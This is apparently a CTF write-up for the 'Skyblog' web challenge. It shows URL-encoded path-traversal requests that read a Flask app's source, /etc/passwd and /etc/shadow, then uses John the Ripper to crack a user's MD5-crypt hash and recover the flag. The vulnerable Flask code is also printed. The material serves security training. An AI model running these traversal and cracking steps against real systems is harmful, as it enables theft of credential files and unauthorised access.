# Skyblog

**Web, 250 points**

> I have an awesome idea ! Yes i do !
> I am launching a new blog platform.
> It is going to be the new Skyblog, better and more profitable than Medium.
> I'm going to be rich !
>
> You can preview the beta over there : http://challenges.urlab.be:16904
>
> *Note: this is a web challenge. You should be able to load a website in a normal browser. If it's not the case, please warn us. (The challenge is unstable due to networking problems)*
>
> **WARNING: do NOT use automated tools like wapiti or nikto**


![screenshot](./screenshot.png)

## Solution

You have a website of a blog. When you click on a blog post, you get an url like this : `http://challenges.urlab.be:16904/post/1%20-%20Hello%20World.md`. You have to try some local file injection by manipulation the url.

A first try could be to try `http://challenges.urlab.be:16904/post/../../../../etc/passwd`. But you have the problem that your browser simplifies the url to `http://challenges.urlab.be:16904/../../../etc/passwd`. You have to urlencode every `/` to `%2F`.

## Optionnal (goto "users passwords")
After some research you try some common file names and find `/post/..%2F/main.py`
You find the source code of the application :

    from flask import Flask
    from flask import render_template
    import glob
    import os
    import markdown

    app = Flask(__name__)

    #### The flag is not here. My guess is that you are looking for a user password :)


    @app.route(&#34;/&#34;)
    def hello():
        posts = [os.path.splitext(os.path.basename((x)))[0] for x in glob.glob(&#34;posts/*.md&#34;)]
        return render_template(&#39;hello.html&#39;, posts=posts)


    @app.route(&#34;/post/&lt;path:title&gt;&#34;)
    def view_post(title):
        with open(os.path.join(&#34;./posts&#34;, title)) as fd:
            raw = fd.read()
            html = markdown.markdown(raw)
            return render_template(&#39;post.html&#39;, post=html, title=title, raw=raw)

    if __name__ == &#34;__main__&#34;:
        app.run(debug=False, host=&#34;0.0.0.0&#34;)

So yes, definitely it's a local file inclusion but the flag is not here :/

## Users passwords

You are looking for a flag/password. You try to get access to the file system root then `/etc/password`.
We can try `http://challenges.urlab.be:16904/post/..%2Fetc%2Fpasswd` but it does not work.

Let's try one directory higher : `http://challenges.urlab.be:16904/post/..%2F..%2Fetc%2Fpasswd`.
It works but does not give any password.

We then try http://challenges.urlab.be:16904/post/..%2F..%2Fetc%2Fshadow`. The website gives us :

    root:*:17185:0:99999:7:::
    daemon:*:17185:0:99999:7:::
    bin:*:17185:0:99999:7:::
    sys:*:17185:0:99999:7:::
    sync:*:17185:0:99999:7:::
    games:*:17185:0:99999:7:::
    man:*:17185:0:99999:7:::
    lp:*:17185:0:99999:7:::
    mail:*:17185:0:99999:7:::
    news:*:17185:0:99999:7:::
    uucp:*:17185:0:99999:7:::
    proxy:*:17185:0:99999:7:::
    www-data:*:17185:0:99999:7:::
    backup:*:17185:0:99999:7:::
    list:*:17185:0:99999:7:::
    irc:*:17185:0:99999:7:::
    gnats:*:17185:0:99999:7:::
    nobody:*:17185:0:99999:7:::
    systemd-timesync:*:17185:0:99999:7:::
    systemd-network:*:17185:0:99999:7:::
    systemd-resolve:*:17185:0:99999:7:::
    systemd-bus-proxy:*:17185:0:99999:7:::
    _apt:*:17185:0:99999:7:::
    flag:$1$AAPF0FVA$lUtYCUZPGuNzJrJ9bAGK10:17215:0:99999:7:::

The `flag:$1$AAPF0FVA$lUtYCUZPGuNzJrJ9bAGK10:17215:0:99999:7:::` looks like the flag !

## Password cracking

But no, it's not the flag ^^

You still have to crack the password hash.
You then crack it with John the ripper and the dictionary we provided.

    john a-file-with-the-hash.txt --wordlist=Project/ctf-challenges/dict.txt
    john a-file-with-the-hash.txt --show

After a few minutes you get back the flag : `pelandosi`
